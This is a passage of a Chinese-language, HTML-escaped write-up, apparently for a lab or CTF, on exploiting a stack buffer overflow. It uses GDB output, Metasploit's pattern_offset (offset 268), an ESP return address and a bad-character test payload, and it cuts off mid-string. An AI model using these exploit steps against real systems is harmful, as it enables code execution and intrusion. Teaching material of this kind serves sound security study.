lass=\"hljs-string\"\u003e'i9Aj'\u003c/span\u003e)\nEFLAGS: \u003cspan class=\"hljs-number\"\u003e0x10282\u003c/span\u003e (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eEIP\u003c/code\u003e被\u003ccode\u003ei9Aj\u003c/code\u003e覆盖，使用offset得出偏移量\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q i9Aj\n[*] Exact \u003cspan class=\"hljs-keyword\"\u003ematch\u003c/span\u003e at offset \u003cspan class=\"hljs-number\"\u003e268\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得出偏移量\u003ccode\u003e268\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看一下利用的ESP \u003ccode\u003e0xffffd350\u003c/code\u003e ，小端取反就是 \u003ccode\u003e'\\x50\\xd3\\xff\\xff'\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e利用思路：\u003ccode\u003eeip\u003c/code\u003e覆盖为\u003ccode\u003eesp\u003c/code\u003e的地址，然后\u003ccode\u003eesp\u003c/code\u003e放入\u003ccode\u003eshellcode\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e坏字节判断\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/cytopia/badchars\"\u003ehttps://github.com/cytopia/badchars\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e坏字节字典，放到\u003ccode\u003eesp\u003c/code\u003e区域提交\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egdb-peda$ r $(python -c \u003cspan class=\"hljs-string\"\u003e\"print('A'*268+'b'*4+'\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x5
